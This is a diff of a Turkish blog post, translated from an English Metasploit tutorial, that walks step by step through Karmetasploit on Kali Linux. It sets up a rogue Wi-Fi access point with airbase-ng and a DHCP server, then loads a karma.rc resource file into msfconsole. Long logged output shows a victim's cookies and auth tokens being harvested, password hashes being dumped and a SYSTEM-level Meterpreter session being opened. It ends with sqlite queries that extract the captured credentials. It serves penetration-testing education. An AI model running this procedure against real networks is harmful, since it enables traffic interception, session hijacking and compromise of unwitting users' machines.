@@ -5,7 +5,7 @@ date: 2017-06-16 09:02:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,19 +13,23 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework timestomp
-- msf meterpreter timestomp
+- Metasploit Framework karmetasploit
+- msf meterpreter karmetasploit
 
-excerpt: Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek **forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter ```timestomp``` adı verilen bir komut sağlamaktadır.
+excerpt: Bu yazıda, Metasploit içinde Karmetasploit hakkında bilgi vermeye çalışacağız. Genel olarak kurulum, ayarlarının yapılması ve örnek kullanımı göreceğiz.
 ---
 
-What is Karmetasploit?
+Bu yazıda, Metasploit içinde Karmetasploit hakkında bilgi vermeye çalışacağız. Genel olarak kurulum, ayarlarının yapılması ve örnek kullanımı göreceğiz.
 
-Karmetasploit is a great function within Metasploit, allowing you to fake access points, capture passwords, harvest data, and conduct browser attacks against clients.
+# Karmetasploit Nedir?
 
-Karmetasploit Configuration
-There is a bit of setup required to get Karmetasploit up and going on Kali Linux Rolling. The first step is to obtain the run control file for Karmetasploit:
+Karmetasploit, access point noktaları oluşturma, parola yakalama, bilgi toplama ve web tarayıcı saldırıları gerçekleştirilmek için kullanılan bir programdır. Kısaca, sahte bir modem veya access point oluşturursunuz. Bir takım kullanıcılar bu noktaya bağlanır. Siz de Karmetasploit sayesinde trafiği dinleyebilirsiniz.
 
+# Karmetasploit Ayarlama
+
+Şimdi, Kali Linux içinde Karmetasploit'in kullanıma hazır hale getirilmesini görelim. İlk adımımız kontrol dosyasının indirme ile başlıyor.
+
+```sh
 root@kali:~# wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt
 --2015-04-03 16:17:27-- https://www.offensive-security.com/downloads/karma.rc
 Resolving www.offensive-security.com (www.offensive-security.com)... 198.50.176.211
@@ -37,8 +41,13 @@ Saving to: `karma.rc' 100%[======================================>] 1,089 --.-K/
 
 2015-04-03 16:17:28 (35.9 MB/s) - `karma.rc' saved [1089/1089]
 root@kali:~#
-Having obtained that requirement, we need to set up a bit of the infrastructure that will be required. When clients attach to the fake AP we run, they will be expecting to be assigned an IP address. As such, we need to put a DHCP server in place. Let’s install a DHCP server onto Kali.
+```
 
+Oluşturacağımız Access Point'e kullanıcılar bağlandığında ne olması gerekir? Tabii ki bağlanan kullanıcıya bir IP adresi atanması beklenir. Bu durumda, Kali Linux işletim sistemini DHCP Sunucu olarak ayarlamalıyız.
+
+Şimdi Kali Linux içine ```isc-dhcp-server``` kuralım.
+
+```sh
 root@kali:~# apt update
 ...snip...
 root@kali:~# apt -y install isc-dhcp-server
@@ -47,8 +56,11 @@ Building dependency tree
 Reading state information... Done
 ...snip...
 root@kali:~#
-Next, let’s configure our ‘dhcpd.conf’ file. We will replace the configuration file with the following output:
+```
 
+Kurulum tamamlandıktan sonra ```dhcpd.conf``` dosyasında gerekli ayarları yapalım. ```dhscpd.conf``` dosyasının bir yedeğini aldıktan sonra aşağıdaki örneğe benzer hale getirmelisiniz.
+
+```sh
 root@kali:~# cat /etc/dhcp/dhcpd.conf
 option domain-name-servers 10.0.0.1;
 
@@ -67,13 +79,23 @@ subnet 10.0.0.0 netmask 255.255.255.0 {
   option domain-name-servers 10.0.0.1;
 }
 root@kali:~#
-Then we need to install a couple of requirements.
+```
 
+Şimdi de bir kaç gerekliliği kuralım.
+
+## libsqlite3-dev Paketini Kuralım
+
+```sh
 root@kali:~# apt -y install libsqlite3-dev
 Reading package lists... Done
 Building dependency tree       
 Reading state information... Done
 ...snip...
+```
+
+## activerecord sqlite3 Ruby Modülleri Kuralım
+
+```sh
 root@kali:~# gem install activerecord sqlite3
 Fetching: activerecord-5.0.0.1.gem (100%)
 Successfully installed activerecord-5.0.0.1
@@ -88,15 +110,27 @@ Installing ri documentation for sqlite3-1.3.12
 Done installing documentation for sqlite3 after 0 seconds
 2 gems installed
 root@kali:~#
-Now we are ready to go. First off, we need to locate our wireless card, then start our wireless adapter in monitor mode with airmon-ng. Afterwards we utilize airbase-ng to start a new wireless network.
+```
 
+Artık Karmetsploit kullanmaya hazırız. Yapacağımız işlemler sırasıyla şöyle;
+
+1. Wireless kartı tespit edelim.
+2. wireless kartı monitor mod ile başlatalım.
+3. Yeni bir Kablosuz ağ başlatalım.
+
+## Wireless Arayüz Adını Tespit Edelim
+
+```sh
 root@kali:~# airmon-ng
 
 
 PHY     Interface       Driver          Chipset
 
 phy0	wlan0	        ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
+```
+## airmon-ng Başlatalım
 
+```sh
 root@kali:~# airmon-ng start wlan0
 
 PHY	Interface	Driver		Chipset
@@ -113,19 +147,29 @@ a short period of time, you may want to kill (some of) them!
 PID     Name
 693     dhclient
 934     wpa_supplicant
+```
 
+## Monitor Mod ile airbase-ng Başlatalım
+
+```sh
 root@kali:~# airbase-ng -P -C 30 -e "U R PWND" -v wlan0mon
 For information, no action required: Using gettimeofday() instead of /dev/rtc
 22:52:25  Created tap interface at0
 22:52:25  Trying to set MTU on at0 to 1500
 22:52:25  Trying to set MTU on wlan0mon to 1800
 22:52:25  Access Point with BSSID 00:C0:CA:82:D9:63 started.
-Airbase-ng has created a new interface for us, “at0”. This is the interface we will now utilize. We will now assign ourselves an IP address.
+```
 
+Yukarıdaki çıktıda görüldüğü gibi ```at0``` isminde yeni bir wireless arayüz başlatıldı. Şimdi, kendi bilgisayarımızı bu ağa dahil edelim.
+
+```sh
 root@kali:~# ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
 root@kali:~#
-Before we run our DHCP server, we need to create a lease database, then we can get it to listening on our new interface.
+```
 
+DHCP Sunucuyu başlatmak üzereyiz. Sunucu başladığında toplanan bilgilerin kayıt edileceği bir veri tabanı ihtiyacımız olacak. Bunun için önce bir veri tabanı oluşturalım ve DHCP sunuyu başlatalım.
+
+```sh
 root@kali:~# touch /var/lib/dhcp/dhcpd.leases
 root@kali:~# dhcpd -cf /etc/dhcp/dhcpd.conf at0
 Internet Systems Consortium DHCP Server 4.3.3
@@ -143,10 +187,11 @@ Sending on   Socket/fallback/fallback-net
 root@kali:~# ps aux | grep [d]hcpd
 root      2373  0.0  0.4  28448  9532 ?        Ss   13:45   0:00 dhcpd -cf /etc/dhcp/dhcpd.conf at0
 root@kali:~#
+```
 
-Karmetasploit in Action
-Now, with everything ready, all that is left is to run Karmetasploit! We start up Metasploit, feeding it our run control file.
+```msfconsole``` programını harici kaynak olarak, ilk başta indirdiğimiz ```karma.rc_.txt``` dosyasını göstererek başlatalım.
 
+```sh
 root@kali:~# msfconsole -q -r karma.rc_.txt
 
 [*] Processing karma.rc_.txt for ERB directives.
@@ -191,10 +236,13 @@ resource (karma.rc_.txt)> run
 
 
 msf auxiliary(http) >
-At this point, we are up and running. All that is required now is for a client to connect to the fake access point. When they connect, they will see a fake “captive portal” style screen regardless of what website they try to connect to. You can look through your output, and see that a wide number of different servers are started. From DNS, POP3, IMAP, to various HTTP servers, we have a wide net now cast to capture various bits of information.
+```
 
-Now lets see what happens when a client connects to the fake AP we have set up.
+Artık oluşturduğumuz Acces Point üzerinden dinleme yapıyoruz. Bir kullanıcı kablosuz bağlantı ile bu noktaya bağlanır ve web üzerinden işlemler yapmaya başladıında tüm trafik veri tabanımıza kayıt edilmektedir.
 
+Kayıt edilen paketlere bakalım.
+
+```sh
 msf auxiliary(http) >
 [*] DNS 10.0.0.100:1276 XID 87 (IN::A www.msn.com)
 [*] DNS 10.0.0.100:1276 XID 87 (IN::A www.msn.com)
@@ -296,19 +344,21 @@ Active sessions
   Id  Description  Tunnel                             
   --  -----------  ------                             
   1   Meterpreter  10.0.0.1:45017 -> 10.0.0.100:1364
+```
 
-Karmetasploit Attack Analysis
-Wow! That was a lot of output! Please take some time to read through the output, and try to understand what is happening.
+Yukarıdaki çıktılardan, kullanıcının bir çok adrese bağlandığını ve işlemler yaptığını görebiliriz. Bu çıktıları parça parça inceleyelim.
 
-Let’s break down some of the output a bit here.
-
+```sh
 [*] DNS 10.0.0.100:1284 XID 92 (IN::A ecademy.com)
 [*] DNS 10.0.0.100:1286 XID 93 (IN::A facebook.com)
 [*] DNS 10.0.0.100:1286 XID 93 (IN::A facebook.com)
 [*] DNS 10.0.0.100:1287 XID 94 (IN::A gather.com)
 [*] DNS 10.0.0.100:1287 XID 94 (IN::A gather.com)
-Here we see DNS lookups which are occurring. Most of these are initiated by Karmetasploit in attempts to gather information from the client.
+```
 
+Bu kısımda, kullanıcının bağlanmak istediği adreslere dair DNS Lookup işlemi yapılmaktadır.
+
+```sh
 [*] HTTP REQUEST 10.0.0.100 > gmail.google.com:80 GET /forms.html Windows IE 5.01 cook
 ies=PREF=ID=474686c582f13be6:U=ecaec12d78faa1ba:TM=1241334857:LM=1241334880: S=snePRUjY-zgcXpEV;NID=22=nFGYMj-l7FaT7qz3zwXjen9_miz8RDn_rA-lP_IbBocsb3m4eFCH6h I1ae23ghwenHaEGltA5hiZbjA2gk8i7m8u9Za718IFyaDEJRw0Ip1sT8uHHsJGTYfpAlne1vB8
 
@@ -351,10 +401,13 @@ Here we can see Karmetasploit collecting cookie information from the client. Thi
 [*] Current server process: rundll32.exe (848)
 [*] New server process: lsass.exe (232)
 [*] Meterpreter session 1 opened (10.0.0.1:45017 -> 10.0.0.100:1364)
-Here is where it gets really interesting! We have obtained the password hashes from the system, which can then be used to identify the actual passwords. This is followed by the creation of a Meterpreter session.
+```
 
-Now we have access to the system, lets see what we can do with it.
+Bu kısımda, kullanıcının parola bilgilerinin, cookie bilgilerinin toplandığı görülmektedir. Bu işlemlerin ardından, hedef bilgisayarda oturum açılmaya çalışılmaktadır.
 
+Açılan Meterpreter oturumunda neler yapılabileceğine bakalım.
+
+```sh
 msf auxiliary(http) > sessions -i 1
 [*] Starting interaction with 1...
 
@@ -415,12 +468,13 @@ meterpreter > pwd
 C:\WINNT\system32
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
-Wonderful. Just like any other vector, our Meterperter session is working just as we expected.
+```
 
-However, there can be a lot that happens in Karmetasploit really fast and making use of the output to standard out may not be usable. Let’s look at another way to access the logged information. We will interact with the karma.db that is created in your home directory.
+Gördüğünüz gibi, açılan oturumda neler yapılabileceğini örnek olarak gösterdik. Ayrıca bilgi toplama devam ettikçe inanılmaz çok bilgi kayıt edilecektir. Bunların kullanımı için veri tabanına bakmak ihtiyacı hissedebilirsiniz. Şimdi veri tabanı ile etkileşim sağlayalım.
 
-Lets open it with sqlite, and dump the schema.
+Veri tabanı Ev klasöründe oluşturulmuştu. Aşağıdaki komut ile veri tabanına bağlanalım.
 
+```sh
 root@kali:~# sqlite3 karma.db
 SQLite version 3.5.9
 Enter ".help" for instructions
@@ -505,8 +559,11 @@ CREATE TABLE vulns_refs (
 'ref_id' INTEGER,
 'vuln_id' INTEGER
 );
-With the information gained from the schema, let’s interact with the data we have gathered. First, we will list all the systems that we logged information from, then afterward, dump all the information we gathered while they were connected.
+```
 
+Veri tabanı şemasından faydalanarak bilgileri kontrol edelim.
+
+```sh
 sqlite> select * from hosts;
 1|2009-05-09 23:47:04|10.0.0.100|||alive||Windows|2000|||x86
 sqlite> select * from notes where host_id = 1;
@@ -534,4 +591,6 @@ sqlite> select * from notes where host_id = 1;
 108|2009-05-10 00:43:29|1|http_cookies|twitter.com auth_token=1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
 109|2009-05-10 00:43:29|1|http_cookies|www.twitter.com auth_token=1241930535--c2a31fa4627149c521b965e0d7bdc3617df6ae1f
 sqlite>
+```
 
+Buradan ötesi, sizin veri tabanı bilginize ve kayıt edilen bilgilerin raporlanmasına kalmış durumdadır.
